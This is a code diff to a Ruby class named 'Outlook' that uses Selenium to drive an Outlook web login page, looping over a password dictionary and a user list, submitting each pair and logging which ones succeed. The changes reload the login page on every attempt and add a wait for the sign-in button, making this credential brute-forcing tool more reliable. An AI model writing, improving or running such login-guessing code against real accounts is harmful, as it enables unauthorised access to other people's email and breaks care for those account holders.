@@ -68,11 +68,13 @@ class Outlook
 		else
 			p = File.new('dictionaries/passwd1','r+')
 		end
-		@driver.get(@base_url + @path)
+		
 		begin
 		    p.each do |passwd|
     	  f = File.new(@file,'r+')
     		f.each do |user|
+    		    @driver.get(@base_url + @path)
+    		    
     				result = File.new(@result_file,'a+')
 						user = user.to_s.strip
   					passwd = passwd.to_s.strip
@@ -84,8 +86,12 @@ class Outlook
     				@driver.find_element(:id, "username").send_keys user.to_s
     				@driver.find_element(:id, "password").clear
     				@driver.find_element(:id, "password").send_keys passwd.to_s
+    				
+    				wait = Selenium::WebDriver::Wait.new(:timeout => 60)
+    				wait.until { @driver.find_element(:css, "input.btn").displayed? }
     				@driver.find_element(:css, "input.btn").click
     				#@driver.find_element(:css, "span.signinTxt").click
+    				
     				if element_present?(:id, "password")
     					#Wrong password
     					@driver.manage.delete_all_cookies
